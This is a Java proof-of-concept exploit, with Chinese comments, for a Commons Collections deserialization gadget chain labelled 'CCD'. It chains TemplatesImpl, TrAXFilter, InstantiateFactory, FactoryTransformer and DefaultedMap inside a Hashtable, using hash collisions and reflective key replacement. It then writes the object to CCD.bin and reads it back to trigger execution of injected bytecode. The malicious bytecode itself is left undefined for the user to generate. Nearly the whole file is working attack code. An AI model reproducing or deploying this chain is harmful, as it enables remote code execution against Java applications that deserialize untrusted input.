import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.map.DefaultedMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

/**
 *Boogipop大佬说的野链
 *参考 https://xz.aliyun.com/t/12135
 */
public class CCD {
    public static void main(String[] args) throws Exception {


        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates,"_name","DawnT0wn");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_bytecodes",targetByteCodes);    //自行生产bytecode

        InstantiateFactory factory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
        FactoryTransformer transformer = new FactoryTransformer(factory);

        HashMap hashmap = new HashMap();
        hashmap.put("zZ", "d");
        DefaultedMap map  = (DefaultedMap) DefaultedMap.decorate(hashmap, transformer);


        FastHashMap fastHashMap1 = new FastHashMap();
        fastHashMap1.put("yy","d");

        Hashtable obj = new Hashtable();
        obj.put("aa", "b");
        obj.put(fastHashMap1, "1");

      
      //实际在比较hashcode的是hashmap.put("zZ", "d");和fastHashMap1.put("yy","d");


      //反射修改Map中的键值对，为了避免程序异常退出
        Field field = obj.getClass().getDeclaredField("table");
        field.setAccessible(true);
        Object[] table = (Object[]) field.get(obj);
        // hashmap的索引会根据key的值而变化，如果要改前面的key的话，这里的索引可以用调试的方式改一下
        Object node = table[2];
        Field keyField;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        if (keyField.get(node) instanceof String){
            keyField.set(node, map);
        }

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CCD.bin"));
        os.writeObject(obj);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CCD.bin"));
        fos.readObject();

    }
    public static void setFieldValue(Object obj,String filename,Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(filename);
        field.setAccessible(true);
        field.set(obj,value);
    }

}
